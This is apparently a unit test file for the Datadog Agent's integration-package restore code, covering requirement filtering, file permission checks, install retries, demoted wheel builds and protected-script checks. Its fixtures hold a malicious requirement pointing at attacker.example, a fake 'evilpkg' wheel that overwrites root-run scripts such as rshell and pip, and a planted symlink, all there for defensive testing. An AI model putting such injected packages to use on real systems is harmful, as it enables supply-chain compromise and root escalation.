import unittest
from packages import extract_version, create_python_installed_packages_file, create_diff_installed_packages_file, check_file_owner_system_windows
from packages import run_command, install_datadog_package, install_dependency_package, install_diff_packages_file
from packages import load_requirements, has_expected_diff_file_permissions, secure_wheelhouse, protected_script_names, wheel_protected_script_collisions
from packages import IntegrationInstallError, IntegrationsRestoreError
import packages
import packaging.requirements
import os
import tempfile
import zipfile
from unittest.mock import patch, call, MagicMock

class TestPackages(unittest.TestCase):

    def test_extract_version(self):
        req = packaging.requirements.Requirement("package==1.0.0")
        expected_version = "1.0.0"
        
        result = extract_version(req)
        
        self.assertEqual(result, expected_version)

    def test_create_python_installed_packages_file(self):
        # create temp directory
        test_directory = tempfile.mkdtemp()
        test_filename = os.path.join(test_directory, "test_installed_packages.txt")
        os.makedirs(test_directory, exist_ok=True)
        
        create_python_installed_packages_file(test_filename)
        
        self.assertTrue(os.path.exists(test_filename))
        
        with open(test_filename, 'r', encoding='utf-8') as f:
            content = f.read()
            self.assertIn("# DO NOT REMOVE/MODIFY", content)
            self.assertIn("invoke", content)

        
        # Cleanup
        os.remove(test_filename)
        
        # running rmdir verifies that the directory is empty
        os.rmdir(test_directory)

    def test_create_diff_installed_packages_file(self):
        test_directory = tempfile.mkdtemp()
        old_file = os.path.join(test_directory, "old_installed_packages.txt")
        new_file = os.path.join(test_directory, "new_installed_packages.txt")
        diff_file = os.path.join(test_directory, ".diff_python_installed_packages.txt")

        with open(old_file, 'w', encoding='utf-8') as f:
            f.write("# DO NOT REMOVE/MODIFY\n")
            f.write("package==1.0.0\n")

        with open(new_file, 'w', encoding='utf-8') as f:
            f.write("# DO NOT REMOVE/MODIFY\n")
            f.write("package==1.0.0\n")
            f.write("newpackage==2.0.0\n")

        create_diff_installed_packages_file(test_directory, old_file, new_file)

        self.assertTrue(os.path.exists(diff_file))
        
        with open(diff_file, 'r', encoding='utf-8') as f:
            content = f.read()
            self.assertIn("# DO NOT REMOVE/MODIFY", content)
            self.assertIn("newpackage==2.0.0", content)

        # Cleanup
        os.remove(old_file)
        os.remove(new_file)
        os.remove(diff_file)
        
        # running rmdir verifies that the directory is empty
        # asserts no extra files are created
        os.rmdir(test_directory)

    # ------------------------------------------------------------------ #
    # load_requirements — direct URL references
    # ------------------------------------------------------------------ #

    def test_load_requirements_rejects_registry_bypasses(self):
        """Direct URL references, non-PEP 508 lines, and file references in any case must be filtered out."""
        test_directory = tempfile.mkdtemp()
        req_file = os.path.join(test_directory, "requirements.txt")

        with open(req_file, 'w', encoding='utf-8') as f:
            f.write("# DO NOT REMOVE/MODIFY\n")
            f.write("package==1.0.0\n")
            f.write("evil @ https://attacker.example/evil.whl\n")
            f.write("https://attacker.example/evil.whl\n")
            f.write("git+https://attacker.example/evil.git\n")
            f.write("-e ./evil\n")
            f.write("evil.whl\n")
            f.write("Evil.WHL\n")
            f.write("evil.Zip\n")

        requirements = load_requirements(req_file)

        self.assertEqual(list(requirements), ['package'])

        # Cleanup
        os.remove(req_file)
        os.rmdir(test_directory)

    # ------------------------------------------------------------------ #
    # has_expected_diff_file_permissions
    # ------------------------------------------------------------------ #

    @unittest.skipIf(os.name == 'nt', "Skip on Windows")
    def test_has_expected_diff_file_permissions(self):
        with patch('packages.os.stat') as mock_stat, patch('packages.pwd.getpwnam') as mock_getpwnam:
            mock_getpwnam.return_value.pw_uid = 1000
            mock_stat.return_value.st_mode = 0o100644

            mock_stat.return_value.st_uid = 0
            self.assertTrue(has_expected_diff_file_permissions("/tmp/.diff_python_installed_packages.txt"))

            mock_stat.return_value.st_uid = 1000
            self.assertTrue(has_expected_diff_file_permissions("/tmp/.diff_python_installed_packages.txt"))

            mock_stat.return_value.st_uid = 1234
            self.assertFalse(has_expected_diff_file_permissions("/tmp/.diff_python_installed_packages.txt"))

            mock_stat.return_value.st_uid = 0
            mock_stat.return_value.st_mode = 0o100666
            self.assertFalse(has_expected_diff_file_permissions("/tmp/.diff_python_installed_packages.txt"))

    # ------------------------------------------------------------------ #
    # run_command
    # ------------------------------------------------------------------ #

    def test_run_command_success_returns_zero_rc(self):
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout='ok\n', stderr='', returncode=0)
            stdout, stderr, rc = run_command(['echo', 'ok'])
        self.assertEqual(rc, 0)
        self.assertEqual(stdout, 'ok\n')

    def test_run_command_failure_returns_nonzero_rc(self):
        import subprocess
        with patch('subprocess.run') as mock_run:
            exc = subprocess.CalledProcessError(1, ['false'], output='', stderr='something went wrong')
            mock_run.side_effect = exc
            stdout, stderr, rc = run_command(['false'])
        self.assertEqual(rc, 1)
        self.assertEqual(stderr, 'something went wrong')

    # ------------------------------------------------------------------ #
    # install_datadog_package — retry logic
    # ------------------------------------------------------------------ #

    @unittest.skipIf(os.name == 'nt', "Skip on Windows")
    def test_install_datadog_package_succeeds_on_first_attempt(self):
        with patch('packages.run_command', return_value=('', '', 0)) as mock_cmd:
            install_datadog_package('datadog-ping==1.0.2', '/tmp/agent')
        mock_cmd.assert_called_once()

    @unittest.skipIf(os.name == 'nt', "Skip on Windows")
    def test_install_datadog_package_succeeds_on_retry(self):
        """First attempt fails, second succeeds — no exception raised."""
        with patch('packages.run_command', side_effect=[('', 'err', 1), ('', '', 0)]) as mock_cmd:
            install_datadog_package('datadog-ping==1.0.2', '/tmp/agent')
        self.assertEqual(mock_cmd.call_count, 2)

    @unittest.skipIf(os.name == 'nt', "Skip on Windows")
    def test_install_datadog_package_raises_after_two_failures(self):
        """Both attempts fail — IntegrationInstallError is raised."""
        with patch('packages.run_command', return_value=('', 'some error', 2)) as mock_cmd:
            with self.assertRaises(IntegrationInstallError) as ctx:
                install_datadog_package('datadog-ping==1.0.2', '/tmp/agent')
        self.assertEqual(mock_cmd.call_count, 2)
        self.assertEqual(ctx.exception.package, 'datadog-ping==1.0.2')
        self.assertEqual(ctx.exception.returncode, 2)

    # ------------------------------------------------------------------ #
    # secure_wheelhouse / protected script collisions
    # ------------------------------------------------------------------ #

    @unittest.skipIf(os.name == 'nt', "Skip on Windows")
    def test_secure_wheelhouse_reowns_dir_and_contents_without_following_symlinks(self):
        """After securing, no entry is dd-agent-writable and planted symlinks never chown their targets."""
        test_directory = tempfile.mkdtemp()
        os.makedirs(os.path.join(test_directory, 'build'))
        wheel_path = os.path.join(test_directory, 'pkg-1.0-py3-none-any.whl')
        with open(wheel_path, 'w') as f:
            f.write('')
        # symlink planted by the demoted user during the build
        target_path = os.path.join(test_directory, 'target')
        with open(target_path, 'w') as f:
            f.write('')
        os.symlink(target_path, os.path.join(test_directory, 'planted-link'))

        with patch('packages.os.lchown') as mock_lchown, patch('packages.os.chown') as mock_chown:
            secure_wheelhouse(test_directory)

        mock_lchown.assert_any_call(os.path.join(test_directory, 'build'), 0, 0)
        mock_lchown.assert_any_call(wheel_path, 0, 0)
        mock_lchown.assert_any_call(os.path.join(test_directory, 'planted-link'), 0, 0)
        mock_lchown.assert_any_call(test_directory, 0, 0)
        mock_chown.assert_not_called()

        # Cleanup
        os.remove(os.path.join(test_directory, 'planted-link'))
        os.remove(target_path)
        os.remove(wheel_path)
        os.rmdir(os.path.join(test_directory, 'build'))
        os.rmdir(test_directory)

    @unittest.skipIf(os.name == 'nt', "Skip on Windows")
    def test_protected_script_names_covers_rshell_pip_and_interpreter(self):
        pip_path = os.path.join(tempfile.mkdtemp(), 'pip')
        with open(pip_path, 'w') as f:
            f.write('#!/opt/datadog-agent/embedded/bin/python3\n')

        names = protected_script_names(pip_path)

        self.assertIn('rshell', names)
        self.assertIn('pip', names)
        self.assertIn('python3', names)

        os.remove(pip_path)
        os.rmdir(os.path.dirname(pip_path))

    @unittest.skipIf(os.name == 'nt', "Skip on Windows")
    def test_wheel_protected_script_collisions_detects_entry_points_and_data_payloads(self):
        """A wheel must not overwrite a root-executed script, via entry points or .data payloads."""
        test_directory = tempfile.mkdtemp()
        wheel_path = os.path.join(test_directory, 'evilpkg-1.0-py3-none-any.whl')
        with zipfile.ZipFile(wheel_path, 'w') as zf:
            zf.writestr('evilpkg-1.0.dist-info/entry_points.txt',
                        '[console_scripts]\nrshell = evilpkg:main\nsafe-tool = evilpkg:tool\n')
            zf.writestr('evilpkg-1.0.data/scripts/pip', '#!/bin/sh\n')
            zf.writestr('evilpkg-1.0.data/data/bin/python3', '#!/bin/sh\n')

        collisions = wheel_protected_script_collisions(test_directory, {'rshell', 'pip', 'python3'})

        self.assertEqual(collisions, {'rshell', 'pip', 'python3'})

        # Cleanup
        os.remove(wheel_path)
        os.rmdir(test_directory)

    # ------------------------------------------------------------------ #
    # install_dependency_package — two-phase install
    # ------------------------------------------------------------------ #

    @unittest.skipIf(os.name == 'nt', "Skip on Windows")
    def test_install_dependency_package_builds_wheels_as_run_as_user_then_installs_as_root(self):
        """With run_as set: download/build runs demoted, install runs as root on a secured wheelhouse."""
        pip = [os.path.join('/opt/datadog-agent', "embedded", "bin", "pip")]
        user = MagicMock()
        user.pw_uid = 1000
        user.pw_gid = 1000
        demote = lambda: None
        with patch('packages.run_command', return_value=('', '', 0)) as mock_cmd, \
             patch('packages.tempfile.mkdtemp', return_value='/tmp/wheelhouse'), \
             patch('packages.demote_fn', return_value=demote) as mock_demote_fn, \
             patch('packages.secure_wheelhouse') as mock_secure, \
             patch('packages.protected_script_names', return_value=set()) as mock_protected, \
             patch('packages.os.chown') as mock_chown, \
             patch('packages.shutil.rmtree') as mock_rmtree:
            install_dependency_package(pip, 'pynvml==11.5.3', run_as=user)

        self.assertEqual(mock_cmd.call_count, 2)
        download_args = mock_cmd.call_args_list[0].args
        install_args = mock_cmd.call_args_list[1].args
        self.assertEqual(
            download_args[0],
            pip + ['wheel', '--wheel-dir', '/tmp/wheelhouse', '--no-cache-dir', 'pynvml==11.5.3']
        )
        self.assertIs(download_args[1], demote)
        self.assertEqual(
            install_args[0],
            pip + ['install', '--no-index', '--find-links', '/tmp/wheelhouse', 'pynvml==11.5.3']
        )
        self.assertEqual(len(install_args), 1)
        mock_demote_fn.assert_called_once_with(user)
        mock_secure.assert_called_once_with('/tmp/wheelhouse')
        mock_protected.assert_called_once_with(pip[0])
        mock_chown.assert_called_with('/tmp/wheelhouse', 1000, 1000)
        mock_rmtree.assert_called_once_with('/tmp/wheelhouse', ignore_errors=True)

    @unittest.skipIf(os.name == 'nt', "Skip on Windows")
    def test_install_dependency_package_refuses_wheels_overwriting_protected_scripts(self):
        """A wheel that would overwrite a root-executed script is refused before the root install."""
        pip = [os.path.join('/opt/datadog-agent', "embedded", "bin", "pip")]
        user = MagicMock()
        user.pw_uid = 1000
        user.pw_gid = 1000
        with patch('packages.run_command', return_value=('', '', 0)) as mock_cmd, \
             patch('packages.tempfile.mkdtemp', return_value='/tmp/wheelhouse'), \
             patch('packages.secure_wheelhouse'), \
             patch('packages.protected_script_names', return_value={'rshell'}), \
             patch('packages.wheel_protected_script_collisions', return_value={'rshell'}) as mock_collisions, \
             patch('packages.os.chown'), \
             patch('packages.shutil.rmtree') as mock_rmtree:
            with self.assertRaises(IntegrationInstallError) as ctx:
                install_dependency_package(pip, 'evilpkg==1.0', run_as=user)

        # only the demoted build ran; the root install was never invoked
        self.assertEqual(mock_cmd.call_count, 1)
        self.assertIn('rshell', str(ctx.exception))
        mock_collisions.assert_called_once_with('/tmp/wheelhouse', {'rshell'})
        mock_rmtree.assert_called_once_with('/tmp/wheelhouse', ignore_errors=True)

    # ------------------------------------------------------------------ #
    # install_diff_packages_file — validation and error collection
    # ------------------------------------------------------------------ #

    @unittest.skipIf(os.name == 'nt', "Skip on Windows")
    @patch('packages.has_expected_diff_file_permissions', return_value=False)
    def test_install_diff_packages_file_refuses_untrusted_file(self, _mock_permissions_check):
        """Validation failure returns False before any install is attempted."""
        install_dir = tempfile.mkdtemp()
        storage_dir = tempfile.mkdtemp()
        diff_file = os.path.join(storage_dir, '.diff_python_installed_packages.txt')
        req_file = os.path.join(install_dir, 'requirements-agent-release.txt')

        with open(diff_file, 'w') as f:
            f.write("evilpackage==1.0.0\n")

        with open(req_file, 'w') as f:
            f.write('')

        with patch('packages.install_datadog_package') as mock_install, \
             patch('packages.install_dependency_package') as mock_install_dep:
            result = install_diff_packages_file(install_dir, diff_file, req_file)

        self.assertFalse(result)
        mock_install.assert_not_called()
        mock_install_dep.assert_not_called()

        # Cleanup
        os.remove(diff_file)
        os.remove(req_file)
        os.rmdir(install_dir)
        os.rmdir(storage_dir)

    @unittest.skipIf(os.name == 'nt', "Skip on Windows")
    @patch('packages.has_expected_diff_file_permissions', return_value=True)
    def test_install_diff_packages_file_collects_failures(self, _mock_permissions_check):
        """All packages are attempted even when some fail; IntegrationsRestoreError lists failures."""
        install_dir = tempfile.mkdtemp()
        storage_dir = tempfile.mkdtemp()
        diff_file = os.path.join(storage_dir, '.diff_python_installed_packages.txt')
        req_file = os.path.join(install_dir, 'requirements-agent-release.txt')

        with open(diff_file, 'w') as f:
            f.write("# DO NOT REMOVE/MODIFY\n")
            f.write("datadog-ping==1.0.2\n")
            f.write("datadog-snmp==1.0.0\n")

        with open(req_file, 'w') as f:
            f.write('')

        # install_datadog_package always raises
        with patch('packages.install_datadog_package', side_effect=IntegrationInstallError('pkg', 1, 'err')) as mock_install:
            with self.assertRaises(IntegrationsRestoreError) as ctx:
                install_diff_packages_file(install_dir, diff_file, req_file)

        # Both packages were attempted
        self.assertEqual(mock_install.call_count, 2)
        self.assertEqual(len(ctx.exception.failures), 2)

        # Cleanup
        os.remove(diff_file)
        os.remove(req_file)
        os.rmdir(install_dir)
        os.rmdir(storage_dir)

    @unittest.skipIf(os.name == 'nt', "Skip on Windows")
    @patch('packages.has_expected_diff_file_permissions', return_value=True)
    def test_install_diff_packages_file_succeeds_silently(self, _mock_permissions_check):
        """When all installs succeed no exception is raised and True is returned."""
        install_dir = tempfile.mkdtemp()
        storage_dir = tempfile.mkdtemp()
        diff_file = os.path.join(storage_dir, '.diff_python_installed_packages.txt')
        req_file = os.path.join(install_dir, 'requirements-agent-release.txt')

        with open(diff_file, 'w') as f:
            f.write("# DO NOT REMOVE/MODIFY\n")
            f.write("datadog-ping==1.0.2\n")

        with open(req_file, 'w') as f:
            f.write('')

        with patch('packages.install_datadog_package') as mock_install:
            result = install_diff_packages_file(install_dir, diff_file, req_file)  # must not raise

        self.assertTrue(result)
        mock_install.assert_called_once_with('datadog-ping==1.0.2', install_dir)

        # Cleanup
        os.remove(diff_file)
        os.remove(req_file)
        os.rmdir(install_dir)
        os.rmdir(storage_dir)
